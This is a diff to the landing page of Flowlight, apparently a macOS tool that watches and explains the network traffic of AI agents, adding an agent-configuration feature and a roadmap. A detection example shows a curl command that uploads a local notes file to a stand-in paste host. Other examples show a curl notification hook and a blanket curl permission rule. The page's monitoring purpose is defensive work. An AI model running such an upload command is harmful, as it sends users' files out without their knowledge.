@@ -161,6 +161,12 @@ nav: home
             <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
         </div>
         <div class="rule">
+          <span class="sev info">⌕ On disk</span>
+          <div><h3>What each agent is set up to do</h3>
+            <p>With your say-so, Flowlight reads the agent's own configuration: skills, subagents, slash commands, hooks, permission rules and MCP servers. Names only, never your code, and nothing leaves the Mac.</p>
+            <p class="example">Notification hook → curl -s -d … https://ntfy.sh/… &nbsp;·&nbsp; allow: Bash(curl:*)</p></div>
+        </div>
+        <div class="rule">
           <span class="sev critical">⚠ Critical</span>
           <div><h3>Sensitive channel</h3>
             <p>The agent sends email, transfers files, opens SSH or remote desktop, goes through a tunnel or proxy, or talks to a database.</p>
@@ -306,6 +312,21 @@ nav: home
     </div>
   </section>
 
+<section class="band" id="roadmap">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Next</p>
+        <h2>What's coming</h2>
+        <p class="lede">Flowlight observes and explains today. These are the three things being built next.</p>
+      </div>
+      <div class="privacy">
+        <div><strong>Block connections</strong><p>Allowlists that enforce rather than warn: refuse what an agent contacts outside its list, with a prompt to allow it once or always.</p></div>
+        <div><strong>Focus mode</strong><p>Watch one app or domain and ignore the rest, for debugging a single agent without the whole Mac in the way.</p></div>
+        <div><strong>Mock responses</strong><p>Answer a chosen URL with your own status, headers and body, to see how an agent copes when an API fails or returns something odd.</p></div>
+      </div>
+    </div>
+  </section>
+
 <section class="band" id="privacy">
     <div class="wrap">
       <div class="section-head">
@@ -348,7 +369,7 @@ nav: home
         <p class="eyebrow">Install</p>
         <h2>Running in under a minute</h2>
         <ol class="steps" style="margin-top:16px">
-          <li><div><strong>Download Flowlight.dmg</strong><p>Open it and drag Flowlight into Applications. A <a href="https://github.com/{{repo}}/releases/latest">.pkg installer</a> is also on every release. The first launch of this preview is blocked: open <strong>System Settings › Privacy &amp; Security</strong> and click <em>Open Anyway</em>.</p></div></li>
+          <li><div><strong>Download Flowlight.dmg</strong><p>Open it and drag Flowlight into Applications. A <a href="https://github.com/{{repo}}/releases/latest">.pkg installer</a> is also on every release. Releases are signed and notarized, so macOS opens it without complaint.</p></div></li>
           <li><div><strong>Launch it</strong><p>Traffic appears within a second, and live ↓↑ rates sit in your menu bar.</p></div></li>
           <li><div><strong>Name your traffic</strong><p>Approve the one-time setup (your password, once) so Flowlight can read hostnames.</p></div></li>
         </ol>
